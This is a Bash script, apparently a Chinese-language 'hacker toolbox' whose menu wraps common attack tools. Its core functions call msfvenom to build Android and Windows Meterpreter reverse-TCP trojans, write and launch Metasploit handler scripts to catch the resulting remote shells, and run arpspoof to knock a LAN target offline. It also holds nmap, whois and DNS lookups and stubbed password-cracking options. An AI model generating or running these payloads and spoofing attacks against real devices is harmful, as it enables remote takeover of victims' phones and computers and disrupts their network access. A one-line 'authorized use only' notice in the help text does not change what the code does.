#!/bin/bash
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"

# 日志文件
LOGFILE="scan.log"

# 日志记录函数
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOGFILE
}

# 控制台菜单
function console {
echo -e "$RED
/\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$                                
 /\$\$__  \$\$                               
 | \$\$  \__/  /\$\$\$\$\$\$\$\$\$\$\$  /\$\$\$\$\$\$  /\$\$\$\$\$\$\$ 
 |  \$\$\$\$\$  /\$\$_____/ |____  \$\$| \$\$__  \$\$ 
  \____  \$\$| \$\$        /\$\$\$\$\$\$\$| \$\$  \ \$\$ 
   /\$\$  \ \$\$| \$\$       /\$\$__  \$\$| \$\$  | \$\$ 
   |  \$\$\$\$\$\$/|  \$\$\$\$\$\$\$|  \$\$\$\$\$\$| \$\$  | \$\$ 
    \______/  \_______/ \_______/|__/  |__/  
    
    by huocai
    https://www.github.com/huocai520
    $NO_COLOR"
    
echo -e "$BLUE
========== 主菜单 ==========\n1.  nmap扫描\n2.  生成木马\n3.  打开监听\n4.  断网攻击\n5.  whois查询\n6.  DNS枚举\n7.  密码破解工具\n8.  帮助信息\n9.  查看日志\n10. 退出此程序\n=========================$NO_COLOR"

echo -e "$GREEN请输入序号进行选择$NO_COLOR"
read number

case $number in
    1) nmapscan_menu ;; 
    2) msfmuma_menu ;; 
    3) jianting_menu ;; 
    4) dw_menu ;; 
    5) whois_menu ;; 
    6) dns_menu ;; 
    7) crack_menu ;; 
    8) show_help ;; 
    9) show_logs ;; 
    10) echo -e "$GREEN感谢使用 Scan 工具箱!$NO_COLOR"; exit 0 ;; 
    *) echo -e "$RED输入错误，请重新选择$NO_COLOR"; console ;;
esac
}

# NMAP扫描菜单
function nmapscan_menu {
echo -e "$GREEN请输入要扫描的ip或者网段$NO_COLOR"
read nmapip
if [ -z "$nmapip" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
nmapscan
}

# NMAP扫描
function nmapscan {
echo -e "$GREEN 
-------------------------------NMAP扫描中...-------------------------------" 
log_message "开始NMAP扫描: $nmapip"
sudo nmap -sT -sV -O $nmapip | tee -a $LOGFILE
echo -e "$GREEN扫描完成$NO_COLOR"
back_to_menu
}

# MSF木马生成菜单
function msfmuma_menu {
echo -e "$GREEN请输入自己的ip$NO_COLOR"
read msflhost
if [ -z "$msflhost" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
echo -e "$GREEN请输入端口$NO_COLOR"
read msflport
if [ -z "$msflport" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
echo -e "$BLUE
请选择生成的木马类型\n1.安卓木马\n2.电脑木马(windows)\n$NO_COLOR"
read muma
msfmuma
}

# MSF木马生成
function msfmuma {
if [ "$muma" == "1" ]; then
    echo -e "$RED
-------------------------------生成安卓木马中...-----------------------------"
    log_message "生成安卓木马: lhost=$msflhost lport=$msflport"
sudo msfvenom -p android/meterpreter/reverse_tcp lhost=$msflhost lport=$msflport R > android.apk
echo -e "$RED
-------------------------------自动设置监听中...-----------------------------" 
echo "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost $msflhost
set lport $msflport
run
" > android.rc
    msfconsole -r android.rc
    log_message "安卓木马生成完成"
    rm -f android.rc
    back_to_menu
elif [ "$muma" == "2" ]; then
    echo -e "$RED
-------------------------------生成Windows木马中...-----------------------------"
    log_message "生成Windows木马: lhost=$msflhost lport=$msflport"
sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=$msflhost lport=$msflport -f exe -o windows.exe
echo -e "$RED
-------------------------------自动设置监听中...-----------------------------"
    echo "
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost $msflhost
set lport $msflport
run" > windows.rc
    msfconsole -r windows.rc
    log_message "Windows木马生成完成"
    rm -f windows.rc
    back_to_menu
else
    echo -e "$RED选择错误$NO_COLOR"
    msfmuma_menu
fi
}

# 监听菜单
function jianting_menu {
echo -e "$GREEN请输入监听IP$NO_COLOR"
read jtip
if [ -z "$jtip" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
echo -e "$GREEN请输入监听端口$NO_COLOR"
read jtport
if [ -z "$jtport" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
echo -e "$BLUE
请选择对方的木马类型\n1.安卓木马\n2.电脑木马(windows)\n$NO_COLOR"
read jtmuma
jianting
}

# 监听设置
function jianting {
echo -e "$RED
-------------------------------自动设置监听中...-----------------------------" 
if [ "$jtmuma" == "1" ]; then
    jtpa='android/meterpreter/reverse_tcp'
    log_message "设置安卓监听: $jtip:$jtport"
elif [ "$jtmuma" == "2" ]; then
    jtpa='windows/meterpreter/reverse_tcp'
    log_message "设置Windows监听: $jtip:$jtport"
else
    echo -e "$RED选择错误$NO_COLOR"
    jianting_menu
    return
fi
echo "
use exploit/multi/handler
set payload $jtpa
set lhost $jtip
set lport $jtport
run" > jt.rc
    msfconsole -r jt.rc
    rm -f jt.rc
    back_to_menu
}

# 断网攻击菜单
function dw_menu {
echo -e "$GREEN
提示:只能在内网环境下使用
$NO_COLOR"
echo -e "$GREEN请输入对方IP$NO_COLOR"
read dwhost
if [ -z "$dwhost" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
echo -e "$GREEN请输入网关$NO_COLOR"
read dwwg
if [ -z "$dwwg" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
dw
}

# 断网攻击
function dw {
echo -e "$RED 
-------------------------------正在进行断网.....-----------------------------" 
log_message "开始ARP欺骗: 目标=$dwhost 网关=$dwwg"
arpspoof -i eth0 -t $dwhost $dwwg
log_message "ARP欺骗完成"
back_to_menu
}

# WHOIS查询菜单
function whois_menu {
echo -e "$GREEN请输入要查询的域名或IP$NO_COLOR"
read whois_target
if [ -z "$whois_target" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
echo -e "$GREEN
-------------------------------WHOIS查询中...-------------------------------" 
log_message "WHOIS查询: $whois_target"
whois $whois_target | tee -a $LOGFILE
echo -e "$GREEN查询完成$NO_COLOR"
back_to_menu
}

# DNS枚举菜单
function dns_menu {
echo -e "$GREEN请输入要枚举的域名$NO_COLOR"
read dns_target
if [ -z "$dns_target" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    console
fi
echo -e "$GREEN
-------------------------------DNS枚举中...-------------------------------" 
log_message "DNS枚举: $dns_target"
dig $dns_target ANY | tee -a $LOGFILE
echo -e "$GREEN枚举完成$NO_COLOR"
back_to_menu
}

# 密码破解工具菜单
function crack_menu {
echo -e "$BLUE
请选择密码破解工具\n1.MD5哈希破解\n2.字典爆破\n3.返回菜单\n$NO_COLOR"
read crack_choice
case $crack_choice in
    1) md5_crack ;; 
    2) dict_crack ;; 
    3) console ;; 
    *) echo -e "$RED选择错误$NO_COLOR"; crack_menu ;;
esac
}

# MD5哈希破解
function md5_crack {
echo -e "$GREEN请输入MD5哈希值$NO_COLOR"
read md5_hash
if [ -z "$md5_hash" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    crack_menu
fi
log_message "开始破解MD5: $md5_hash"
echo -e "$GREEN正在破解 ($md5_hash)...$NO_COLOR"
# 这里可以集成在线MD5破解工具或本地字典
echo "破解功能可扩展集成在线服务或本地字典库"
back_to_menu
}

# 字典爆破
function dict_crack {
echo -e "$GREEN请输入目标URL$NO_COLOR"
read target_url
if [ -z "$target_url" ]; then
    echo -e "$RED输入不能为空$NO_COLOR"
    crack_menu
fi
echo -e "$GREEN请输入字典文件路径$NO_COLOR"
read dict_file
if [ ! -f "$dict_file" ]; then
    echo -e "$RED字典文件不存在$NO_COLOR"
    crack_menu
fi
log_message "开始字典爆破: URL=$target_url 字典=$dict_file"
echo -e "$GREEN正在爆破 $target_url...$NO_COLOR"
# 这里可以使用hydra或其他工具
echo "字典爆破功能可集成hydra或其他工具"
back_to_menu
}

# 帮助信息
function show_help {
echo -e "$BOLD_CYAN
========== 使用帮助 ==========\n\nScan - 一个懒人式的黑客工具箱\n\n功能说明:\n1. NMAP扫描: 用于网络主机和端口扫描\n2. 生成木马: 使用MSF生成Android和Windows木马\n3. 打开监听: 监听入站连接并建立Shell会话\n4. 断网攻击: 在局域网内进行ARP欺骗导致目标断网\n5. WHOIS查询: 查询域名和IP的注册信息\n6. DNS枚举: 枚举域名的DNS记录\n7. 密码破解: 提供MD5破解和字典爆破工具\n\n注意事项:\n- 仅在授权的环境下使用\n- 某些功能需要root权限\n- 断网攻击仅限局域网环境\n- 所有操作都会记录在 $LOGFILE\n\n联系方式:\nGithub: https://www.github.com/huocai520\n\n========== 使用帮助 ==========$NO_COLOR"
back_to_menu
}

# 查看日志
function show_logs {
echo -e "$BOLD_CYAN
========== 操作日志 ==========$NO_COLOR"
if [ -f "$LOGFILE" ]; then
    cat $LOGFILE
else
    echo -e "$RED暂无日志$NO_COLOR"
fi
back_to_menu
}

# 返回菜单函数
function back_to_menu {
echo -e "$GREEN
按Enter键返回菜单...$NO_COLOR"
read
console
}

# 主入口
log_message "Scan工具箱已启动"
console